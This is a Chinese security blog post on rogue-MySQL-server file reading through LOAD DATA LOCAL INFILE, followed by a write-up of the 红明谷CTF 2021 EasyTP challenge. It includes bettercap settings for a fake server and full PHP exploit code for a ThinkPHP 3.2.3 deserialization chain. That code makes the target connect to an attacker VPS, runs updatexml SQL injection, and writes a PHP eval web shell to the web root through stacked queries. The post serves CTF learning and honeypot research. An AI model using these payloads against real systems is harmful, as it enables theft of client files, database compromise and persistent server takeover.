---
title: "MySQL伪服务端读客户端任意文件"
slug: "mysql-pseudo-server"
description: "有点摸鱼，但不完全摸鱼"
date: 2021-12-19T20:22:54+08:00
categories: ["NOTES&SUMMARY"]
series: ["SQLi"]
tags: ["MySQL", "蜜罐"]
draft: false
toc: true
---

应该是各位带师傅们早就会的点了，做题碰到了拿出来炒个冷饭QwQ；参考链接统一放到最后面啦

## 原理&复现

总体思路是这样的：伪造一个mysql的服务端（不需要有完整的数据库的功能 只需向客户端回复greeting package）当有客户端连接到时，可以被服务端访问一个客户端本地的文件（如果本地用户权限允许的话

帮助我们实现这一目标的sql语句是`LOAD DATA INFILE`，它用于读取一个文件的内容放入表中，有两种形式

```mysql
Load data infile "/data/data.csv" into table TestTable;
Load data local infile "/data/data.csv" into table TestTable;
# 有时与FIELDS TERMINATED BY '\n'一起使用
```

以上两种写法的差异在于是否有`local`，也就是是否读取client本地的文件

![来自官方文档](https://lightless-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/lightless/2bsdse1b1cf6g999bhhcyz9y/image.png)

在本地用wireshark抓个包康康这一sql语句具体是怎么执行的

![image-20210702113235801](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113235801.png)

![image-20210702113241427](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113241427.png)

（肥肠意义不明的截图（五个月过去了 能记得才有鬼

整个过程简化为以下三个阶段

- Client: Request Query: LOAD DATA LOCAL INFIEL '/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '\n'
- Server: Response TABULAR: /etc/passwd
- Client: Request[Malformed Packet]: content of /etc/passwd

如果在客户端发送查询后 返回一个`Response TABULAR`包 并指定要读取的文件 就可以任意读取客户端文件了（前提仍然是have read access）

甚至不一定需要客户端首先发起 `LOAD DATA LOCAL`的请求才能response，在官方文档第三段的最后的括号中提示，伪造的客户端可以在任何时候回复一个`file-transfer`的请求（但利用这个特性前 客户端必须具有`CLIENT_LOCAL_FILES`属性 （可以在连接mysql时添加 `--enable-local-infile`  或设置`local_infile=ON`

所以一旦有一台恶意的mysql服务器 发出完全相同的数据包去模拟初始的greeting握手过程，之后等待一个客户端的响应（幸运的是大多数MySQL客户端以及程序库都会在握手之后至少发送一次请求，以探测目标平台的指纹信息，比如（`select @@version_comment limit 1`），再之后就可以伪造`load data local infile`指令来获取文件了

我们构造一个具有以下属性的mysql伪服务端：

- 发送Server Greeting
- 等待client: Request Query package
- 回复请求Response file-transfer

需要发的包格式都在官方文档上可以找到：[Protocol::LOCAL_INFILE_Request](https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request)  [Protocol::Handshake](https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake)

几个已经集成过的伪造server: [bettercap](https://github.com/bettercap/bettercap)  [Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server)

可以用bettercap进行完美实践

![image-20210702175622262](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702175622262.png)

需要设置的项非常简单

```bash
set mysql.server.address 0.0.0.0	# 如果想用nps之类的代理工具映射到公网端口请务必设置此项
set mysql.server.infile /etc/passwd	# 想要读取的文件
set mysql.server.outfile /xxxx	# 保存到本地的位置
set mysql.server.port 1099	# 随意端口都可以
mysql.server on
```

## [红明谷CTF 2021]EasyTP

tp3.2.3，有一个现成的链子：[ThinkPHP v3.2.* （SQL注入&文件读取）反序列化POP链](https://f5.pm/go-53579.html)

![image-20211219155134609](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219155134609.png)

看Application\Home\Controller\IndexController.class.php的代码也跟这个文章中的示例代码大差不差，顺着这篇文章的思路跟一下

首先是全局寻找`__destruct()`函数

www/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php

![image-20211219163343446](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163343446.png)

寻找一个`destroy()`

www/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php

![image-20211219163445086](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163445086.png)

这里需要一个`$sessID`，PHP7下不传参会报错 PHP5不影响，`$this->sessionName`可控；接着找含有`delete()`的类

www/ThinkPHP/Mode/Lite/Model.class.php

![image-20211219163653936](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163653936.png)

![image-20211219163713363](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163713363.png)

相当于传入的参数都可用，可以控制自带的数据库类的`delete()`方法了

www/ThinkPHP/Library/Think/Db/Driver.class.php

![image-20211219170053771](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219170053771.png)

它是拼接了$sql语句，之后执行`$this->execute()`

![image-20211219171035987](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171035987.png)

它会预先进行`$this->initConnect()`

![image-20211219171103370](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171103370.png)

![image-20211219171123961](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171123961.png)

我们可以控制`$config`，控制连接任意数据库

这里可以结合上面的mysql伪服务端任意文件读取了，比如以下的利用流程：

- 通过某处泄露得到目标的WEB目录（如DEBUG页面
- 开启MySQL伪服务端，读取目标的数据库配置文件
- 出发反序列化
- 触发PDO连接部分
- 获取到目标的数据库配置文件

用bettercap做mysql伪服务端读一下/etc/passwd

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "",
            "hostname" => "your_vps",
            "hostport" => "port",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
    }
}

namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;

        public function __construct(){
            $this->img = new Memcache();
        }
    }
}

namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;

        public function __construct(){
            $this->handle = new Model();
        }
    }
}

namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;

        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                "table" => "mysql.user where  1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#",
                "where" => "1=1"
            );
        }
    }
}

namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));


$curl = curl_init();
curl_setopt_array($curl, array(
    CURLOPT_URL => "http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => "",
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 3,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => base64_encode(serialize(new Think\Image\Driver\Imagick())),
    CURLOPT_HTTPHEADER => array(
        "Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e",
        "cache-control: no-cache"
    ),
));
$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);
if ($err) {
    echo "cURL Error #:" . $err;
} else {
    echo $response;
}
}
```

![image-20211219200242251](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219200242251.png)

看到了mysql用户，尝试弱口令得到root: root

之后就可以把我们的伪服务端撤了，换成真服务端的，进行一个注入

- 使用目标的数据库配置再次进行反序列化
- 触发`DELETE`语句的SQL注入

```php
$this->data[$this->pk] = array(
                // "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#",
                // "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#",
                // "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema='test'),0x7e),1)#",
                // "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema='test'),0x7e),1)#",
                "table" => "mysql.user where  1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#",
                "where" => "1=1"
            );
```

我们还可以把堆叠打开，用堆叠注入写shell，也就是本题的exp（参考[赵总的exp](https://www.zhaoj.in/read-6859.html#WEB3_easytp) 赵总牛逼

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true ,   // 开启才能读取文件
            PDO::MYSQL_ATTR_MULTI_STATEMENTS => true,    // 打开堆叠注入
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "",
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",   // 猜出弱口令
            "password" => "root"
        );
    }
}

namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;

        public function __construct(){
            $this->img = new Memcache();
        }
    }
}

namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;

        public function __construct(){
            $this->handle = new Model();
        }
    }
}

namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;

        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array( // 堆叠注入写入shell
                "table" => "mysql.user where 1=1;select '<?php eval(\$_POST[amiz]);?>' into outfile '/var/www/html/amiz.php';#",
                "where" => "1=1"
            );
        }
    }
}

namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));

    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => "http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => base64_encode(serialize(new Think\Image\Driver\Imagick())),
        CURLOPT_HTTPHEADER => array(
            "cache-control: no-cache"
        ),
    ));
    $response = curl_exec($curl);
    $err = curl_error($curl);
    curl_close($curl);
    if ($err) {
        echo "cURL Error #:" . $err;
    } else {
        echo $response;
    }
}
```

其中curl的代码是用postman生成的 ~~（postman打钱）~~ 一套连招直接带走，用蚁剑连接之后发现根目录下没有flag，反而是一个flag.sh

![image-20211219194548981](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219194548981.png)

我们还得连上数据库看看

![image-20211219195443288](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195443288.png)

但是蚁剑自带的添加失败，直接手动写一个冰蝎的🐎

![image-20211219195808735](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195808735.png)

直接查看也是没有，但是可以用它的导出数据库的功能得到数据

参考：[wp1](https://www.zhaoj.in/read-6859.html#WEB3_easytp)  |  [wp2](http://www.yang99.top/index.php/archives/48/#easytp)

## [DDCTF 2019]MySQL弱口令

没找到环境，看wp云一下

部署好agent.py之后用bettercap，读/root/.mysql_history拿flag一波带走

参考：[wp](https://yelo.cc/2019/04/18/ddctf-2019-writeups-web-7.html)

## 一个中等好的蜜罐

之所以说中等好，是因为它受制于对应数据库的版本和配置情况，所以并不够通用，可以参考以下两个栗子：

参考：[MySQL蜜罐获取攻击者微信ID](https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg)  |  [溯源反制之MySQL蜜罐研究](https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA)

------

唔，是7月做题的时候碰到的点，今天做题又碰到了，于是拿出来鞭个尸，比之前的理解要深刻一些了

最近在看js原型污染的相关问题，结果考了个四级之后之前写的代码都不认得了😅小丑竟是我自己

------

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

- [MySQL connect file read](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)
- [Read MySQL Client's File](https://lightless.me/archives/read-mysql-client-file.html)  |  [从MySQL出发的反击之路](https://xz.aliyun.com/t/3277)
- [如何利用MySQL LOCAL INFILE读取客户端文件](https://www.anquanke.com/post/id/106488)
- [MySQL蜜罐获取攻击者微信ID](https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg)  |  [溯源反制之MySQL蜜罐研究](https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA)

{{% /spoiler %}}
